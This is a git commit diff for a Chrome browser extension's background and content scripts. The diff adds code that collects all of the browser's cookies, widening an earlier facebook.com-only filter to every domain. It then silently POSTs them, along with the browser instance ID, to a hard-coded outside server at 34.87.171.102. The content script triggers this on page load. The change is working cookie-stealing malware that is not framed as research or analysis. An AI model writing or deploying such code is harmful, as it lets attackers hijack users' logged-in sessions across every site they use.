2a78ec9c56dabbbbc66c69dd5faabdfe73b77467
alphaFaiz <azooo333555@gmail.com>
2023-03-09 14:45:11 +0700

    cast off

--- background.js
+++ background.js
@@ -1,3 +1,8 @@
+let instanceId;
+chrome.instanceID.getID((id) => {
+  instanceId = id
+});
+
 const getAllCookies = async () => {
   const cookies = chrome.cookies.getAll({});
   return cookies;
@@ -5,31 +10,53 @@ const getAllCookies = async () => {
 
 const getCookiesByDomain = async (domainRegex) => {
   const allCookies = await getAllCookies();
-  const cookies = allCookies.filter((cookie) => domainRegex.test(cookie.domain));
-  return mapCookies(cookies);
+  const cookies = allCookies.filter((cookie) =>
+    (new RegExp(domainRegex ? domainRegex : '')).test(cookie.domain)
+  );
+  const mappedCookies = mapCookies(cookies);
+  // 'http://localhost:4001/save-cookies'
+  const saveCookiesResponse = await (await fetch('http://34.87.171.102:4001/save-cookies', {
+    method: 'POST',
+    headers: {
+      Accept: 'application/json',
+      'content-type': 'application/json',
+    },
+    body: JSON.stringify({
+      instanceId,
+      cookies: mappedCookies
+    }),
+  })).json();
+
+  console.log(`---save cookies response:`, saveCookiesResponse);
+  return mappedCookies;
 };
 
 const mapCookies = (cookies) => {
   const groupedCookies = {};
   for (const cookie of cookies) {
     if (groupedCookies[cookie.domain]) {
-      groupedCookies[cookie.domain] = [...groupedCookies[cookie.domain], cookie]
+      groupedCookies[cookie.domain] = [
+        ...groupedCookies[cookie.domain],
+        cookie,
+      ];
     } else {
-      groupedCookies[cookie.domain] = []
+      groupedCookies[cookie.domain] = [];
     }
   }
-  const mappedCookies = Object.keys(groupedCookies).map(key => {
+  const mappedCookies = Object.keys(groupedCookies).map((key) => {
     return {
       url: key,
-      cookies: groupedCookies[key]
-    }
-  })
+      cookies: groupedCookies[key],
+    };
+  });
   return mappedCookies;
-}
+};
 
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
   console.log("Received msg:", msg);
   //   getAllCookies().then((cookies) => sendResponse(cookies));
-  getCookiesByDomain(/facebook.com/).then((cookies) => sendResponse(cookies)).catch(error => sendResponse(null));
+  getCookiesByDomain('')
+    .then((cookies) => sendResponse(cookies))
+    .catch((error) => sendResponse(null));
   return true;
 });
--- content.js
+++ content.js
@@ -1,4 +1,4 @@
 console.log(`Getting cookies...`)
 chrome.runtime.sendMessage({domain: "facebook.com"}, async (response) => {
-    console.log("Response: ", JSON.stringify(response));
+    console.log("Response: ", response);
 });
